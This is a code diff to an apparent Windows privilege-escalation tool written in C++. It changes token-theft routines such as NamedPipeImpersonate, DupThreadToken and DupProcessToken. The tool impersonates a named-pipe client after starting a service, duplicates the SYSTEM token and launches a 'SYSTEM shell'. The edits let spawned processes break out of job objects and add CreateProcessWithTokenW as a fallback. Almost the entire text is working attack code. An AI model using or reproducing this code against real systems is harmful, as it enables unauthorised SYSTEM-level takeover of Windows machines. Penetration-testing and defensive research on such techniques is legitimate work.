@@ -58,9 +58,9 @@ void NamedPipeImpersonate()
     DWORD messageLenght = lstrlen(message) * 2;
     DWORD bytesWritten = 0;
 
-    std::wcout << "Creating named pipe " << pipeName << std::endl;
+    std::wcout << "Creating named pipe and sleeping for 3 seconds " << pipeName << std::endl;
     serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
-
+    Sleep(3000);
     WinExec("cmd.exe /c sc start plumber", 0);
     /* [Deprecated]
     if (HINSTANCE retVal2 = ShellExecuteW(NULL, L"open", L"cmd.exe", L"/k sc start plumber", NULL, SW_HIDE))
@@ -114,10 +114,10 @@ void NamedPipeImpersonate()
         wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
         goto cleanup;
     }
+   
 
-
-    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
-
+    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB;
+    BOOL bRet;
 
     if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
         goto cleanup;
@@ -137,17 +137,35 @@ void NamedPipeImpersonate()
     ZeroMemory(&si, sizeof(STARTUPINFO));
     si.cb = sizeof(STARTUPINFO);
     si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");
-
+   
     if (CreateProcessAsUser(hSystemTokenDup, NULL, command, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
     {
         printf("[+] successfully created a SYSTEM shell!!!\n");
+        fflush(stdout);
+        WaitForSingleObject(pi.hProcess, INFINITE);
     }
     else
     {
-        printf("[!] There was an error creating the SYSTEM shell using CreateProcessAsUser: %d\n", GetLastError());
+        printf("[!] There was an error creating the SYSTEM shell using CreateProcessAsUser: %d\nTrying another method...", GetLastError());
+        fflush(stdout);
+        WaitForSingleObject(pi.hProcess, INFINITE);
     }
-    fflush(stdout);
-    WaitForSingleObject(pi.hProcess, INFINITE);
+    bRet = CreateProcessWithTokenW(hSystemTokenDup, NULL, NULL, command, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi);
+
+    if (bRet == 0)
+    {
+        printf("[!] CreateProcessWithToken didn't cooperate...permissions maybe???\n");
+        printf("Return value: %d\n", GetLastError());
+        fflush(stdout);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+    }
+    else
+    {
+        printf("[+] CreateProcessWithToken worked!!!\n");
+        printf("Return value: %d\n", bRet);
+        fflush(stdout);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+    }
 cleanup:
     if (hSystemToken)
         CloseHandle(hSystemToken);
@@ -358,8 +376,7 @@ int LowerProcessIntegrity(DWORD pid, int integritylevel)
             if (SetTokenInformation(hNewToken, TokenIntegrityLevel, &TIL,
                 sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(pIntegritySid)))
             {
-                dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
-
+                dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB;
 
                 if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
                 {
@@ -481,14 +498,15 @@ int DupThreadToken(DWORD pid)
     {
         wprintf(L"[!] OpenThreadToken(). Error: %d\n", GetLastError());
     }
-
+    
     if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
     {
         wprintf(L"[!] DuplicateTokenEx() failed. Error: %d\n", GetLastError());
     }
+        
+   
 
-
-    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
+    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB;
 
     if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
     {
@@ -630,7 +648,7 @@ int DupProcessToken(DWORD pid)
     {
         printf("[+] DuplicateTokenEx success!!!\n");
     }
-    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
+    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB;
 
 
     if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
